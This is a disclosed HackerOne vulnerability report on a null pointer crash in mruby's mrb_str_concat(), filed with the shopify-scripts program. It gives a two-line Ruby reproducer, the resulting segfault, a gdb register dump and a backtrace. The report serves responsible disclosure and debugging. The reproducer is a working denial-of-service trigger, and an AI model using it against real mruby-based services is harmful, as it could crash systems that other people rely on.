# SIGSEGV Null Pointer mrb_str_concat()

## Report Details
- **Report ID**: 192734
- **URL**: https://hackerone.com/reports/192734
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-20T13:06:20.011Z
- **Disclosed**: 2017-02-10T21:56:48.373Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Sample
---------------------

The following code triggers the bug (attached as mrb_str_concat.rb):

	a=String.new
	a.concat(a)

Crash
---------------------

	x@x:~/Desktop/research/mruby-engine/bin$ ./mruby-engine-mirb 
	mirb - Embeddable Interactive Ruby Shell

	> a=String.new
	a.concat(a)
	 => ""
	> Segmentation fault

Debug
---------------------

	(gdb) r mruby-engine-mirb 
	Starting program: /usr/bin/ruby mruby-engine-mirb
	[Thread debugging using libthread_db enabled]
	Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
	[New Thread 0x7ffff7ff7700 (LWP 27170)]
	[Thread 0x7ffff7ff7700 (LWP 27170) exited]
	process 27160 is executing new program: /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/build/host/bin/mirb
	mirb - Embeddable Interactive Ruby Shell

	> a=String.new
	a.concat(a)
	 => ""
	> 
	Program received signal SIGSEGV, Segmentation fault.
	0x000000000041baa8 in mrb_str_concat (mrb=mrb@entry=0x6cd010, self=self@entry=..., other=...) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/string.c:764
	764	  RSTR_PTR(s1)[len] = '\0';
	(gdb) info reg
	rax            0x0	0
	rbx            0x6d4c90	7163024
	rcx            0x0	0
	rdx            0x0	0
	rsi            0x0	0
	rdi            0x0	0
	rbp            0x6d4c90	0x6d4c90
	rsp            0x7fffffffc4c0	0x7fffffffc4c0
	r8             0x48bee6	4767462
	r9             0x1	1
	r10            0x6cd010	7131152
	r11            0x0	0
	r12            0x0	0
	r13            0x6cd010	7131152
	r14            0x2	2
	r15            0x6cd010	7131152
	rip            0x41baa8	0x41baa8 <mrb_str_concat+280>
	eflags         0x10246	[ PF ZF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) list *$rip
	0x41baa8 is in mrb_str_concat (/home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/string.c:764).
	759	  if (RSTRING_CAPA(self) < len) {
	760	    resize_capa(mrb, s1, len);
	761	  }
	762	  memcpy(RSTR_PTR(s1)+RSTR_LEN(s1), RSTR_PTR(s2), RSTR_LEN(s2));
	763	  RSTR_SET_LEN(s1, len);
	764	  RSTR_PTR(s1)[len] = '\0';  // Bug is here.
	765	}
	766	
	767	/*
	768	 *  call-seq: (Caution! String("abcd") remain)

Backtrace
---------------------

	(gdb) bt
	#0  0x000000000041baa8 in mrb_str_concat (mrb=mrb@entry=0x6cd010, self=self@entry=..., other=...) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/string.c:764
	#1  0x000000000045a1ec in mrb_str_concat2 (mrb=0x6cd010, self=...) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-string-ext/src/string.c:151
	#2  0x0000000000405cf3 in mrb_vm_exec (mrb=mrb@entry=0x6cd010, proc=<optimized out>, proc@entry=0x6d4c30, pc=0x72e098) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1171
	#3  0x000000000040c22c in mrb_vm_run (mrb=mrb@entry=0x6cd010, proc=proc@entry=0x6d4c30, self=..., stack_keep=stack_keep@entry=2) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772
	#4  0x0000000000402dd9 in main (argc=<optimized out>, argv=<optimized out>) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549

Impact
---------------------

This vulnerability is caused by NullPointer error. It can not be exploited, but it can cause DoS.

## Attachments
- mrb_str_concat.rb
